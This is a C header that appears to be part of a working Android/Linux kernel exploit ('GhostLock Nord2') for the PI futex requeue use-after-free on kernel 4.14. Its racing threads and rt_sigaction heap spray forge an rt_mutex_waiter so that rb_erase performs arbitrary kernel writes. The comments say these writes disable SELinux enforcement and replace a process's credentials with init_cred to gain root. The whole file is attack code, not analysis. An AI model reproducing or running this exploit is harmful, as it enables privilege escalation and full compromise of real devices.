/*
 * GhostLock Nord2 - PI futex UAF route
 */
#pragma once
#define _GNU_SOURCE
#include <stdint.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <stdatomic.h>
#include <sys/resource.h>
#include <sys/select.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <time.h>
#include "nord2_offsets.h"

#ifndef SYS_futex
#define SYS_futex 98
#endif
#ifndef SYS_sched_setattr
#define SYS_sched_setattr 274
#endif

struct my_sched_attr {
    uint32_t size, sched_policy;
    uint64_t sched_flags;
    int32_t  sched_nice;
    uint32_t sched_priority;
    uint64_t sched_runtime, sched_deadline, sched_period;
};

struct route_state {
    uint32_t f_wait, f_pi_target, f_pi_chain;
    atomic_int waiter_tid, waiter_ready, waiter_waiting;
    atomic_int owner_started, owner_chain_done;
    atomic_int route_done, consume_go, consume_stop;
    int pselect_shift;
    uint64_t fake_task, fake_lock;
    uint64_t page_base;
    uint64_t write_target;   /* target VA to write to */
    uint64_t write_value;    /* value to write (fake_right) */
};

static void rs_reset(struct route_state *rs) {
    rs->f_wait = rs->f_pi_target = rs->f_pi_chain = 0;
    atomic_store(&rs->waiter_tid,      0);
    atomic_store(&rs->waiter_ready,    0);
    atomic_store(&rs->waiter_waiting,  0);
    atomic_store(&rs->owner_started,   0);
    atomic_store(&rs->owner_chain_done,0);
    atomic_store(&rs->route_done,      0);
    atomic_store(&rs->consume_go,      0);
}

static void fdset_word(fd_set *s, int idx, uint64_t v) {
    ((unsigned long*)s)[idx] = (unsigned long)v;
}
static void put_gword(fd_set *in, fd_set *out, fd_set *ex, int gw, uint64_t v) {
    int wps = (PSELECT_ROUTE_NFDS + 63)/64;
    int si = gw/wps, wi = gw%wps;
    if      (gw<0) return;
    else if (si==0) fdset_word(in,  wi, v);
    else if (si==1) fdset_word(out, wi, v);
    else if (si==2) fdset_word(ex,  wi, v);
}
static void build_fdsets(fd_set *in, fd_set *out, fd_set *ex, struct route_state *rs) {
    FD_ZERO(in); FD_ZERO(out); FD_ZERO(ex);
    int s = rs->pselect_shift;
    struct { int w; uint64_t v; } ws[] = {
        {2,0},{3,0},{4,0},{5,1},{6,0},{7,0},{8,0},{9,0},{10,1},{11,0},
        {12, rs->fake_task}, {13, rs->fake_lock}, {14, 3},
    };
    for (size_t i = 0; i < sizeof(ws)/sizeof(ws[0]); i++)
        put_gword(in, out, ex, ws[i].w + s, ws[i].v);
}

static void open_selected_fds(fd_set *in, fd_set *out, fd_set *ex,
                               int block_fd, int nfds) {
    int high = fcntl(block_fd, F_DUPFD, nfds + 32);
    if (high < 0) return;
    for (int fd = 0; fd < nfds; fd++)
        if (FD_ISSET(fd,in)||FD_ISSET(fd,out)||FD_ISSET(fd,ex)) dup2(high, fd);
    close(high);
    dup2(block_fd, nfds-1);
    FD_SET(nfds-1, ex);
}

static void *owner_fn(void *arg) {
    struct route_state *rs = arg;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(0,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    struct sched_param sp={.sched_priority=50}; sched_setscheduler(0,SCHED_FIFO,&sp);
    syscall(SYS_futex,&rs->f_pi_target,FUTEX_LOCK_PI,0,NULL,NULL,0);
    while (!atomic_load(&rs->waiter_ready)) usleep(500);
    atomic_store(&rs->owner_started,1);
    syscall(SYS_futex,&rs->f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&rs->owner_chain_done,1);
    for(;;) sleep(1);
    return NULL;
}

static void *waiter_fn(void *arg) {
    struct route_state *rs = arg;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(1,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    atomic_store(&rs->waiter_tid,(int)syscall(SYS_gettid));
    syscall(SYS_futex,&rs->f_pi_chain,FUTEX_LOCK_PI,0,NULL,NULL,0);
    atomic_store(&rs->waiter_ready,1);
    while (!atomic_load(&rs->owner_started)) usleep(500);
    struct timespec ts; clock_gettime(CLOCK_MONOTONIC,&ts); ts.tv_sec+=30;
    atomic_store(&rs->waiter_waiting,1);
    syscall(SYS_futex,&rs->f_wait,FUTEX_WAIT_REQUEUE_PI,0,&ts,&rs->f_pi_target,0);

    /*
     * KERNEL 4.14 rt_mutex_waiter CORRECT layout:
     *   +0x00: tree_entry.rb_parent_color
     *   +0x08: tree_entry.rb_right
     *   +0x10: tree_entry.rb_left
     *   +0x18: pi_tree_entry.rb_parent_color  ← target-8 for rb_erase write
     *   +0x20: pi_tree_entry.rb_right          ← fake_right (init_cred)
     *   +0x28: pi_tree_entry.rb_left           ← 0
     *   +0x30: task                            ← init_task
     *   +0x38: lock                            ← page_base+LOCK_OFF
     *   +0x40: prio (int32)                    ← FAKE_WAITER_PRIO
     *   +0x48: deadline                        ← 0
     *
     * sigaction overlay (sigaction_start = depth 0x1e0, waiter = depth 0x1d8):
     * sigaction offset = waiter offset + 0x08
     *   sa_flags (+0x08)    = waiter[+0x00] = tree.__rb_parent_color (set to fake_lock)
     *   sa_restorer (+0x10) = waiter[+0x08] = tree.rb_right (set to 0)
     *   sa_mask[0] (+0x18)  = waiter[+0x10] = tree.rb_left (0)
     *   sa_mask[8] (+0x20)  = waiter[+0x18] = pi_tree.pc  = target-8  KEY!
     *   sa_mask[16](+0x28)  = waiter[+0x20] = pi_tree.right= fake_right KEY!
     *   sa_mask[24](+0x30)  = waiter[+0x28] = pi_tree.left = 0
     *   sa_mask[32](+0x38)  = waiter[+0x30] = task          = init_task
     *   sa_mask[40](+0x40)  = waiter[+0x38] = lock          = fake_lock
     *   sa_mask[48](+0x48)  = waiter[+0x40] = prio          = 140
     *   sigsetsize = 0x40 (64 bytes covers all fields)
     */
    if (rs->page_base) {
        int64_t skb_d = -0xe80LL;
        uint64_t payload_base = rs->page_base + (uint64_t)(int64_t)skb_d;
        uint64_t fake_lock_addr = payload_base + 0x0E80ULL;
        uint64_t fake_w0_addr   = payload_base + 0x1180ULL;

        /* Compute target and fake_right for the write:
         * pi_tree.rb_right = fake_right gets written to *target via rb_erase.
         * For Write 1: target=selinux_enforcing, fake_right=0 (NULL → writes 0).
         * For Write 2: target=child_task+CRED_OFF, fake_right=init_cred.
         * The SKB payload's fake_w0 already has the correct target-8 and fake_right.
         * We reproduce them here for the sigaction spray.
         */
        uint64_t stext_rt = rs->fake_task - 0x1c6d300ULL;
        /* Use write_target/write_value set by caller */
        uint64_t target    = rs->write_target ? rs->write_target : (stext_rt + 0x2272fd8ULL);
        uint64_t fake_right= rs->write_value;  /* 0=NULL for selinux, init_cred for W2 */

        uint8_t sabuf[0x18+64]; /* sigaction header + 64 bytes sa_mask */
        memset(sabuf, 0, sizeof(sabuf));

        /* sa_handler = 0 (SIG_DFL) */
        /* sa_flags (+0x08) = waiter->tree.pc = fake_lock (non-zero, non-self) */
        *(uint64_t*)(sabuf+0x08) = fake_lock_addr;
        /* sa_restorer (+0x10) = waiter->tree.right = 0 (NULL child) */
        *(uint64_t*)(sabuf+0x10) = 0;
        /* sa_mask[0..7] (+0x18) = waiter->tree.left = 0 */
        /* sa_mask[8..15](+0x20) = waiter->pi_tree.pc = target-8 */
        *(uint64_t*)(sabuf+0x20) = target - 8;
        /* sa_mask[16..23](+0x28) = waiter->pi_tree.right = fake_right = 0 (NULL) */
        *(uint64_t*)(sabuf+0x28) = fake_right;
        /* sa_mask[24..31](+0x30) = waiter->pi_tree.left = 0 */
        /* sa_mask[32..39](+0x38) = waiter->task = init_task */
        *(uint64_t*)(sabuf+0x38) = rs->fake_task;
        /* sa_mask[40..47](+0x40) = waiter->lock = fake_lock */
        *(uint64_t*)(sabuf+0x40) = fake_lock_addr;
        /* sa_mask[48..51](+0x48) = waiter->prio = FAKE_WAITER_PRIO */
        *(int32_t*)(sabuf+0x48) = 140;

        /* Spray many times - owner unlock loop triggers UAF read */
        for (int rep = 0; rep < 256; rep++)
            syscall(134/*SYS_rt_sigaction*/, SIGUSR1, sabuf, NULL, (size_t)64);
    }

    atomic_store(&rs->route_done,1);
    syscall(SYS_futex,&rs->f_pi_chain,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
    while (!atomic_load(&rs->owner_chain_done)) usleep(500);
    return NULL;
}

static void *consumer_fn(void *arg) {
    struct route_state *rs = arg;
    cpu_set_t cs; CPU_ZERO(&cs); CPU_SET(3,&cs); sched_setaffinity(0,sizeof(cs),&cs);
    int seen=0;
    while (!atomic_load(&rs->consume_stop)) {
        int seq=atomic_load(&rs->consume_go);
        if (!seq||seq==seen){__asm__ volatile("yield":::"memory");continue;}
        seen=seq;
        pid_t tid=(pid_t)atomic_load(&rs->waiter_tid);
        for (int i=0;i<200&&atomic_load(&rs->consume_go)==seq;i++){
            struct my_sched_attr a={.size=sizeof(a),.sched_nice=19};
            syscall(SYS_sched_setattr,(long)tid,&a,0UL);
            struct timespec ft={0,10000000};
            long r=syscall(SYS_futex,&rs->f_pi_target,FUTEX_LOCK_PI,0,&ft,NULL,0);
            if (r==0) syscall(SYS_futex,&rs->f_pi_target,FUTEX_UNLOCK_PI,0,NULL,NULL,0);
            usleep(500);
        }
        atomic_store(&rs->consume_go,0);
    }
    return NULL;
}

static int run_route(struct route_state *rs) {
    rs_reset(rs);
    pthread_t ot,wt,ct;
    pthread_create(&ot,NULL,owner_fn,rs);
    pthread_create(&wt,NULL,waiter_fn,rs);
    pthread_create(&ct,NULL,consumer_fn,rs);
    while (!atomic_load(&rs->waiter_waiting)||!atomic_load(&rs->owner_started)) usleep(1000);
    usleep(50000);
    syscall(SYS_futex,&rs->f_wait,FUTEX_CMP_REQUEUE_PI,1,(void*)1UL,&rs->f_pi_target,0);
    atomic_store(&rs->consume_go,1);
    int w=0; while (!atomic_load(&rs->route_done)&&w++<5000) usleep(1000);
    usleep(300000);
    atomic_store(&rs->consume_stop,1);
    pthread_join(ct,NULL);
    pthread_detach(ot); pthread_detach(wt);
    return atomic_load(&rs->route_done);
}
